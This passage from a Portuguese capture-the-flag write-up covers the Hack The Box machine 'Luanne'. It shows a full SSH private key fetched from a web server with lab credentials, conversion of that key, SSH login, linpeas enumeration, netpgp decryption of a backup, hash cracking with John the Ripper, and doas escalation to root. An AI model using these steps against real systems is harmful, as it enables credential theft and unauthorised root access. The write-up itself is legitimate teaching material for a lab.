% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 601 0 601 0 0 293k 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 586k
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;/&amp;gt;
&amp;lt;style &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
table &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
border-top: 1px solid black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
border-bottom: 1px solid black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
th &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; background: aquamarine&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;:nth-child&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;even&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; background: lavender&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&amp;lt;/style&amp;gt;
&amp;lt;title&amp;gt;Index of ~r.michaels/&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Index of ~r.michaels/&amp;lt;/h1&amp;gt;
&amp;lt;table &lt;span class=&quot;nv&quot;&gt;cols&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3&amp;gt;
&amp;lt;thead&amp;gt;
&amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;th&amp;gt;Name&amp;lt;th&amp;gt;Last modified&amp;lt;th &lt;span class=&quot;nv&quot;&gt;align&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;right&amp;gt;Size
&amp;lt;tbody&amp;gt;
&amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;td&amp;gt;&amp;lt;a &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;../&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Parent Directory&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 18:20&amp;lt;td &lt;span class=&quot;nv&quot;&gt;align&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;right&amp;gt;1kB
&amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;td&amp;gt;&amp;lt;a &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id_rsa&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;id_rsa&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 16:52&amp;lt;td &lt;span class=&quot;nv&quot;&gt;align&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;right&amp;gt;3kB
&amp;lt;/table&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ao baixar este arquivo, notamos que se trata de uma chave OpenSSH,  a qual possivelmente nos permitirá logar com a conta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.michaels&lt;/code&gt; e obter a flag do usuário.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; webapi_user
Enter host password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'webapi_user'&lt;/span&gt;:iamthebest

% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 2610 100 2610 0 0 2548k 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 2548k
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; OPENSSH PRIVATE KEY-----
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
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; OPENSSH PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ao validar a chave RSA existente (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;) notei que não se trata de uma chave RSA, mas uma chave &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPENSSH&lt;/code&gt;. Para convertê-la precisei realizar os seguintes procedimentos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Remover a quebra de linha ao final do arquivo, após a instrução &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-----END OPENSSH PRIVATE KEY-----&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Conversão de OpenSSH para RSA usando o comando abaixo, assim como a redefinição das permissões para que pudéssemos utilizá-la com o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, informando a senha da chave a ser exportada em branco.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
ssh-keygen &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; PEM &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./id_rsa
Key has comment &lt;span class=&quot;s1&quot;&gt;'r.michaels@luanne.htb'&lt;/span&gt;
Enter new passphrase &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;no passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
Enter same passphrase again:
Your identification has been saved with the new passphrase.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Com esta chave, o acesso com a conta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.michaels&lt;/code&gt;foi possível, onde obtivemos o flag de usuário.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa r.michaels@10.10.10.218
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.218 (10.10.10.218)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '&lt;/span&gt;10.10.10.218&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
Last login: Sat Feb 20 07:14:11 2021 from 10.10.14.33
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
  
Welcome to NetBSD!
  
luanne$ id &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; ls -la
uid=1000(r.michaels) gid=100(users) groups=100(users)
/home/r.michaels
total 52
dr-xr-x--- 7 r.michaels users 512 Sep 16 18:20 .
drwxr-xr-x 3 root wheel 512 Sep 14 06:46 ..
-rw-r--r-- 1 r.michaels users 1772 Feb 14 2020 .cshrc
drwx------ 2 r.michaels users 512 Sep 14 17:16 .gnupg
-rw-r--r-- 1 r.michaels users 431 Feb 14 2020 .login
-rw-r--r-- 1 r.michaels users 265 Feb 14 2020 .logout
-rw-r--r-- 1 r.michaels users 1498 Feb 14 2020 .profile
-rw-r--r-- 1 r.michaels users 166 Feb 14 2020 .shrc
dr-x------ 2 r.michaels users 512 Sep 16 16:51 .ssh
dr-xr-xr-x 2 r.michaels users 512 Nov 24 09:26 backups
dr-xr-x--- 4 r.michaels users 512 Sep 16 15:02 devel
dr-x------ 2 r.michaels users 512 Sep 16 16:52 public_html
-r-------- 1 r.michaels users 33 Sep 16 17:16 user.txt
luanne$ cat user.txt
&amp;lt;redacted&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;No home directory do usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.michaels&lt;/code&gt; encontrada uma pasta chamada backups, que contém um arquivo criptografado &lt;strong&gt;devel_backup-2020-09-16.tar.gz.enc&lt;/strong&gt;. Para descriptografá-lo precisamos de uma senha ou chave deste usuário.&lt;/p&gt;

&lt;p&gt;Executando o script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; vi alguns insights interessantes que nos ajudariam a encontrar o caminho para o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Usuário r.michaels possui acessos &lt;strong&gt;doas&lt;/strong&gt; de execução como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, equivalentes ao &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; em outras distribuições;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Checking doas.conf
permit r.michaels as root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Chave PGP para o app &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netpgp&lt;/code&gt;, que permite criptografar, descriptografar e assinar arquivos;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Do I have PGP keys?
gpg Not Found
/usr/bin/netpgpkeys
1 key found
&quot;pub&quot; 2048/&quot;RSA (Encrypt or Sign)&quot; &quot;op&quot; 2020-09-14
Key fingerprint: &quot;027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a &quot;
uid &quot;RSA 2048-bit key &amp;lt;r.michaels@localhost&amp;gt;&quot; &quot;&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Caminhos user writable:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/home/r.michaels
/tmp
/var/mail
/var/mail/r.michaels
/var/shm
/var/spool/sockets
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Uma vez que ja temos as informações acima, segui com a tentativa descriptografar o arquivo de backup utilizando a chave pgp encontrada. O ponto importante neste item é utilizar um caminho user writable, neste caso o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/shm&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luanne&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netpgp &lt;span class=&quot;nt&quot;&gt;--decrypt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/shm/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc
signature 2048/RSA &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Encrypt or Sign&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 3684eb1e5ded454a 2020-09-14
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a
uid RSA 2048-bit key &amp;lt;r.michaels@localhost&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Analisando o conteúdo do arquivo compactado, vimos que temos os arquivos utilizados para a API e index.html, mas o que chamou a atenção foi o conteúdo do &lt;strong&gt;.htpasswd&lt;/strong&gt;, que embora tivesse o mesmo user(&lt;em&gt;webapi_user&lt;/em&gt;), apresentava uma senha diferente da já encontrada.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tree &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; devel-2020-09-16
devel-2020-09-16
├── webapi
│ └── weather.lua
└── www
├── .htpasswd
└── index.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Utilizando o mesmo método feito para o arquivo anterior, foi encontrada a senha &lt;strong&gt;littlebear&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;md5crypt-long ./www/.htpasswd
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;md5crypt-long, crypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;and variants&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD5 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 2 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
littlebear &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;webapi_user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-02-20 16:02&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1.333g/s 17216p/s 17216c/s 17216C/s mirame..limewire
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Assim como o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;, o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doas&lt;/code&gt; requer que uma senha seja informada, onde &lt;strong&gt;littlebear&lt;/strong&gt; funcionou como esperado, permitindo a obtenção da flag de root:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;doas /bin/sh
Password:
&lt;span class=&quot;c&quot;&gt;# hostname &amp;amp;&amp;amp; id&lt;/span&gt;
luanne.htb
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;operator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,20&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;staff&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,31&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;guest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,34&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nvmm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# cat /root/root.txt&lt;/span&gt;
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Espero que tenham gostado!&lt;/p&gt;

&lt;p&gt;Vejo vocês novamente em breve! :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-easy" /><category term="htb-linux" /><summary type="html">Olá pessoal! A máquina desta semana será Luanne, outra máquina Linux classificada como fácil do Hack The Box, , criada por polarbearer.</summary></entry></feed>